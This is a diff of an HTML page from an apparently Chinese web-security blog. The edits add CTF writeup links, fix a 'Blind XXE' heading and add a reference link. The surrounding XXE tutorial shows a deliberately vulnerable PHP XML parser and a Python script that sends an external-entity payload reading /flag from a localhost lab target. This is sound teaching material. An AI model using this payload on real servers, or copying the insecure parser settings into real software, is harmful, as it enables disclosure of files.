@@ -134,7 +134,8 @@ document.addEventListener('DOMContentLoaded', function () {
 <li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
 <li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
 <li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024杯 Web</a></li>
-<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020</a></li>
+<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li>
 </ul>
 <h1 id="靶机系列"><strong>靶机系列</strong></h1>
 <h2 id="HackTheBox">HackTheBox</h2>
@@ -387,7 +388,7 @@ function sidebar_toggle() {
 <p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130142215.png" alt=""></p>
 <p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p>
 <p>但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。</p>
-<h3 id="无回显读取本地敏感文件（Blind-XEE）">无回显读取本地敏感文件（Blind XEE）</h3>
+<h3 id="无回显读取本地敏感文件（Blind-XXE）">无回显读取本地敏感文件（Blind XXE）</h3>
 <h4 id="payload1">payload1</h4>
 <p>目标靶机：xxe_blind_test.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -494,6 +495,9 @@ php:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php_xxe/doLogin.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;user&gt;&lt;username&gt;&amp;foo;&lt;/username&gt;&lt;password&gt;0&lt;/password&gt;&lt;/user&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data=payload,headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
 <h3 id="True-XML-cookbook">True XML cookbook</h3>
 <p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226154009.png" alt=""></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/winner0911/article/details/50600494">https://blog.csdn.net/winner0911/article/details/50600494</a></p>
+</blockquote>
 <p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153933.png" alt=""></p>
 <p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153418.png" alt=""></p>
 <h3 id="CSAWQual-2019-Web-Unagi">[CSAWQual 2019]Web_Unagi</h3>
